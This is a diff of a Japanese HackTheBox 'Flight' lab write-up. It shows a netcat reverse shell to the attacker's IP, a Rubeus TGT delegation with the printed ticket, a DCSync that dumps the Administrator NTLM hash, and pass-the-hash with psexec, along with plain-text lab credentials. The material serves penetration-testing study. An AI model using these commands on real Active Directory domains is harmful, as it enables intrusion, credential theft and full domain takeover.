@@ -709,7 +709,7 @@ c.bumのリバースシェル取得
 ```sh
 └─$ rlwrap nc -lnvp 5555
 listening on [any] 5555 ...
-connect to [10.10.16.6] from (UNKNOWN) [10.129.228.120] 51044
+connect to [10.10.16.6] from (UNKNOWN) [10.129.200.222] 51044
 Microsoft Windows [Version 10.0.17763.2989]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
@@ -771,7 +771,7 @@ cmd /c C:\inetpub\development\nc.exe -e cmd 10.10.16.6 6666
 ```powershell
 └─$ rlwrap nc -lnvp 6666
 listening on [any] 6666 ...
-connect to [10.10.16.6] from (UNKNOWN) [10.129.228.120] 52930
+connect to [10.10.16.6] from (UNKNOWN) [10.129.200.222] 52930
 Microsoft Windows [Version 10.0.17763.2989]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
@@ -782,11 +782,37 @@ iis apppool\defaultapppool
 
 
 ## STEP 8
+念のためコンピュータアカウントg0$のプライマリグループidを確認、516でありドメコンであることを確認
+```sh
+└─$ ldapsearch -b 'DC=flight,DC=htb' -LLL -s 'sub' -D 'c.bum@flight.htb' -H ldap://10.129.200.222 -w 'Tikkycoll_431012284' 'sAMAccountName=g0$' 'primaryGroupID'
+dn: CN=G0,OU=Domain Controllers,DC=flight,DC=htb
+primaryGroupID: 516
+```
+所属グループであるドメインコントローラはドメインに対して、DS-Replication-Get-Changes-All権限をもつことを確認
+```sh
+└─$ ldapsearch -b 'DC=flight,DC=htb' -LLL -s 'sub' -D 'c.bum@flight.htb' -H ldap://10.129.200.222 -w 'Tikkycoll_431012284' 'sAMAccountName=Domain Controllers' 'distinguishedName' 
+dn: CN=Domain Controllers,CN=Users,DC=flight,DC=htb
+distinguishedName: CN=Domain Controllers,CN=Users,DC=flight,DC=htb
+
+└─$ impacket-dacledit -ts -dc-ip '10.129.200.222' -principal-dn 'CN=Domain Controllers,CN=Users,DC=flight,DC=htb' -target-dn 'DC=flight,DC=htb' -action read -ace-type 'allowed' 'flight.htb/c.bum:Tikkycoll_431012284'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[2025-10-17 02:04:51] [*] Parsing DACL
+[2025-10-17 02:04:53] [*] Printing parsed DACL
+[2025-10-17 02:04:53] [*] Filtering results for SID (S-1-5-21-4078382237-1492182817-2568127209-516)
+[2025-10-17 02:04:53] [*]   ACE[12] info                
+[2025-10-17 02:04:53] [*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
+[2025-10-17 02:04:53] [*]     ACE flags                 : None
+[2025-10-17 02:04:53] [*]     Access mask               : ControlAccess
+[2025-10-17 02:04:53] [*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
+[2025-10-17 02:04:53] [*]     Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
+[2025-10-17 02:04:53] [*]     Trustee (SID)             : Domain Controllers (S-1-5-21-4078382237-1492182817-2568127209-516)
+```
 ドメコン機能をもつマシンアカウントのチケットをrubeusで取得する
 ```sh
 └─$ cp /usr/share/windows-resources/rubeus/Rubeus.exe .        
 
-└─$ python3.13 -m http.server 80                                                                                                                                      
+└─$ python3.13 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 rubeus実行  
@@ -825,6 +851,7 @@ C:\Users\Public>.\rubeus.exe tgtdeleg /nowrap
 
       doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECgHBiEQVn4ZViv9i3MF8N65eX7rtTp6EtVlwg6a2zy3Wm7oIgFBk/badWdyyaYlVuKSg3IgiSaqH9xPJtlps0/Cotu6hJjC+IxF2kXPPaYMVy0+OiFIOQ0wOCNvX/rmyOf7bmrp2CTfgYmJYsNQke+AdncCdAZmn07S644WV9ldOG/33Q6G+63WVQxvTQf+Dxei5FLURqdqtXl+dcR7zei38uJVHA3ihsoEVgg/sGcD37/r7Aw5BUmZl1IqxJoarrvEDp9Es41Np2ETYmJ4m1vrG7ka13xYw/8x8yuGvgHPRvxLZ0+1OdBs6TRoiWI64iaD5sc1CWKSPz/tyL7G+o4Il7SfsNO3Aj+oZKiPv4fkkZOY22ba98LzxGrL6e6dv78ALbgy4Z7FqP5TbKGnhtjITs9ZbHLXXzBT/nc/nEaQyE2/faIOkdu5B0uKvrPJhYnPHR2dEe5xGQVxe9bFCQRvzKeOJnOrj5WQA9cRxN/+wPk6jRZL1QkuE5QufumAOsN2/S/HYgO/jbxCMcD401YAly5tc9JZ5QbZDmX1sk+gF/8Z3iPtFYAvYUb05ykjj23KNZ6lJQCVnOeMBSlkH2K2+sUd3+wKv+XYix8f9iCsXdPeskewWc/hPr3NZgKG4CLbn298yNjc2jYYQSOig4PESKcILXxYKLnXSCnT4+ZEvhl3DCHNCpLj0S+DGN+ayG8+r614jGWor/QBSWA0hBGISRg/kab75u0Sn5TdSxn4xbShhkTywZju93gOn2aD4G02XoewJgvLc50KSkuAIsrKp5JelZIPkpNKy9RvcCmzbOKqlIF6FrVDMPhdRFM3Ooen/pb2kFb3cQvIZgVWP8h9MM+rnYu7dw4vABRZtJQXXmcvFxQ3kOtB84QgjHT8WAaN/wKJue+0jCRiq3CKUuEL8b/hS/YAkDbGqXp9Q6WOtLeGl8kU+uB9sWIaBqoJYzfujsQgtvA5KHZx6xuWZVfbreDI2z1hHUiaIdUSnogkSiW/Bbs36gyY44UqHnwXltuHEuJzzHlil1PThbqAEdd3QgvdkUWAvvzS/N49qxzNM8nal8E4kDqEMUFS0M5iaVUwI8yQ4DKu4mCcFYb1p+gzWh2E2IQ2w/uOpUwxfmg/+Xjy7JWFPWjT/hFF6w1kXU1zO5k1HQ5vjVaerzLsEUu3uvq2enycGT2XfhXphF9T0me2iIK1lohvO1AU/VgVGyFwhvXyyilXYHggwzU9f3vsCKD51AYKTxo75t0kjuBM3PmCs32K66PgJ1I+pYB1cIRFdg0n/Dpidi6fwO9MCT2TWNV+XwhVKeyU1jJG0oaWIc5d3IwNyifafhDN2IA+H18dLdEYX1WbyWwG19jG3pRQcieiJxWX+Yy1wo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgzNXrB/OnwsLr2Bu1Oc63G3+vL8KVu7/Ln+EhtFlNbmuhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MTAxNjE4NDk1NlqmERgPMjAyNTEwMTcwNDQ5NTZapxEYDzIwMjUxMDIzMTg0OTU2WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
 ```
+kerberosチケットをlinux上で使用するためには、kirbiからccacheに変換
 ```sh
 └─$ base64 -d base64_ticket.kirbi > ticket.kirbi
 
@@ -836,28 +863,50 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 └─$ export KRB5CCNAME=ticket.ccache
 ```
-impacket-secretsdumpが役に立たんかった、ぼけ
+チケットの詳細を確認
 ```sh
-└─$ netexec smb g0.flight.htb --use-kcache --ntds drsuapi --user administrator
-SMB         g0.flight.htb   445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
-SMB         g0.flight.htb   445    G0               [+] FLIGHT.HTB\G0$ from ccache 
-SMB         g0.flight.htb   445    G0               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
-SMB         g0.flight.htb   445    G0               [+] Dumping the NTDS, this could take a while so go grab a redbull...
-SMB         g0.flight.htb   445    G0               Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
-SMB         g0.flight.htb   445    G0               [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/ntds/G0_g0.flight.htb_2025-10-16_161215.ntds of which 1 were added to the database
-SMB         g0.flight.htb   445    G0               [*] To extract only enabled accounts from the output file, run the following command: 
-SMB         g0.flight.htb   445    G0               [*] cat /home/kali/.nxc/logs/ntds/G0_g0.flight.htb_2025-10-16_161215.ntds | grep -iv disabled | cut -d ':' -f1
-SMB         g0.flight.htb   445    G0               [*] grep -iv disabled /home/kali/.nxc/logs/ntds/G0_g0.flight.htb_2025-10-16_161215.ntds | cut -d ':' -f1
-```
-```sh
-└─$ impacket-psexec -ts -hashes ':43bbfc530bab76141b12c8446e30c17c' 'administrator@10.129.228.120'
+└─$ impacket-describeTicket ticket.ccache 
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[2025-10-16 16:15:29] [*] Requesting shares on 10.129.228.120.....
+[*] Number of credentials in cache: 1
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : ccd5eb07f3a7c2c2ebd81bb539ceb71b7faf2fc295bbbfcb9fe121b4594d6e6b
+[*] User Name                     : G0$
+[*] User Realm                    : FLIGHT.HTB
+[*] Service Name                  : krbtgt/FLIGHT.HTB
+[*] Service Realm                 : FLIGHT.HTB
+[*] Start Time                    : 16/10/2025 14:49:56 PM
+[*] End Time                      : 17/10/2025 00:49:56 AM (expired)
+[*] RenewTill                     : 23/10/2025 14:49:56 PM
+[*] Flags                         : (0x60a10000) forwardable, forwarded, renewable, pre_authent, enc_pa_rep
+[*] KeyType                       : aes256_cts_hmac_sha1_96
+[*] Base64(key)                   : zNXrB/OnwsLr2Bu1Oc63G3+vL8KVu7/Ln+EhtFlNbms=
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : krbtgt/FLIGHT.HTB
+[*]   Service Realm               : FLIGHT.HTB
+[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
+[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
+```
+dcsync攻撃成功！  
+ちなみに、ipアドレスでなくホスト名を指定しないとPassTheTicketできなかった
+```sh
+└─$ impacket-secretsdump -k -just-dc-user administrator -just-dc-ntlm -dc-ip 10.129.200.222 g0.flight.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
+[*] Cleaning up...
+```
+```sh
+└─$ impacket-psexec -ts -hashes ':43bbfc530bab76141b12c8446e30c17c' 'administrator@10.129.200.222'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[2025-10-16 16:15:29] [*] Requesting shares on 10.129.200.222.....
 [2025-10-16 16:15:33] [*] Found writable share ADMIN$
 [2025-10-16 16:15:34] [*] Uploading file lfxyvzfW.exe
-[2025-10-16 16:15:39] [*] Opening SVCManager on 10.129.228.120.....
-[2025-10-16 16:15:42] [*] Creating service RzEV on 10.129.228.120.....
+[2025-10-16 16:15:39] [*] Opening SVCManager on 10.129.200.222.....
+[2025-10-16 16:15:42] [*] Creating service RzEV on 10.129.200.222.....
 [2025-10-16 16:15:44] [*] Starting service RzEV.....
 [!] Press help for extra shell commands
 Microsoft Windows [Version 10.0.17763.2989]
